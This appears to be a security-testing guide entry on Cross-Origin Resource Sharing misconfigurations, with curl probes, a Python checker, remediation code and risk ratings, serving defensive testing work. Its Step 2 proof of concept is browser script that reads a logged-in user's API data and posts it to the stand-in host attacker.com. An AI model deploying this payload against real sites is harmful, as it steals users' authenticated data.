# WSTG-CLNT-07: Testing for Cross-Origin Resource Sharing (CORS)

## Test ID
WSTG-CLNT-07

## Test Name
Testing for Cross-Origin Resource Sharing (CORS)

## High-Level Description

CORS is a browser mechanism that allows controlled access to resources from different origins. Misconfigured CORS policies can allow malicious websites to read sensitive data from authenticated users, leading to data theft.

---

## What to Check

- [ ] Wildcard (*) Access-Control-Allow-Origin
- [ ] Origin reflection without validation
- [ ] null origin acceptance
- [ ] Credentials with permissive CORS
- [ ] Internal endpoints exposed

---

## How to Test

### Step 1: Test CORS Headers

```bash
#!/bin/bash
TARGET="https://target.com/api/user"

# Test with attacker origin
curl -sI -H "Origin: https://evil.com" "$TARGET" | grep -i "access-control"

# Test with null origin
curl -sI -H "Origin: null" "$TARGET" | grep -i "access-control"

# Test with subdomain
curl -sI -H "Origin: https://sub.target.com" "$TARGET" | grep -i "access-control"

# Test reflection
curl -sI -H "Origin: https://target.com.evil.com" "$TARGET" | grep -i "access-control"
```

### Step 2: CORS Exploitation PoC

```html
<!-- Host this on attacker.com -->
<!DOCTYPE html>
<html>
<body>
<script>
    // If CORS allows evil.com, this will work
    fetch('https://target.com/api/user', {
        credentials: 'include'
    })
    .then(response => response.json())
    .then(data => {
        // Send stolen data to attacker
        fetch('https://attacker.com/log', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    });
</script>
</body>
</html>
```

### Step 3: CORS Tester

```python
#!/usr/bin/env python3
import requests

class CORSTester:
    def __init__(self, url):
        self.url = url
        self.findings = []

    def test_cors(self):
        """Test CORS configuration"""
        print(f"[*] Testing CORS on {self.url}")

        test_origins = [
            ("https://evil.com", "Arbitrary origin"),
            ("null", "Null origin"),
            ("https://target.com.evil.com", "Suffix match bypass"),
            ("https://eviltarget.com", "Prefix/suffix confusion"),
        ]

        for origin, description in test_origins:
            headers = {"Origin": origin}
            response = requests.get(self.url, headers=headers)

            acao = response.headers.get("Access-Control-Allow-Origin", "")
            acac = response.headers.get("Access-Control-Allow-Credentials", "")

            if origin in acao or acao == "*":
                severity = "High" if acac.lower() == "true" else "Medium"
                print(f"[VULN] {description}: ACAO={acao}, ACAC={acac}")
                self.findings.append({
                    "origin": origin,
                    "description": description,
                    "acao": acao,
                    "credentials": acac,
                    "severity": severity
                })

    def generate_report(self):
        print("\n" + "="*50)
        print("CORS SECURITY REPORT")
        print("="*50)

        if not self.findings:
            print("\nNo CORS issues found.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['description']}")
                print(f"  Origin: {f['origin']}")
                print(f"  ACAO: {f['acao']}")

# Usage
tester = CORSTester("https://target.com/api/user")
tester.test_cors()
tester.generate_report()
```

---

## Remediation

```python
# Proper CORS configuration
ALLOWED_ORIGINS = ['https://trusted.com', 'https://app.trusted.com']

@app.after_request
def add_cors_headers(response):
    origin = request.headers.get('Origin')

    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'

    return response
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| CORS with credentials + arbitrary origin | 8.1 | High |
| Wildcard CORS without credentials | 5.3 | Medium |
| null origin accepted | 6.5 | Medium |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-942** | Permissive Cross-domain Policy with Untrusted Domains |

---

## Checklist

```
[ ] CORS headers analyzed
[ ] Arbitrary origins tested
[ ] null origin tested
[ ] Credentials header checked
[ ] PoC created if vulnerable
[ ] Findings documented
```
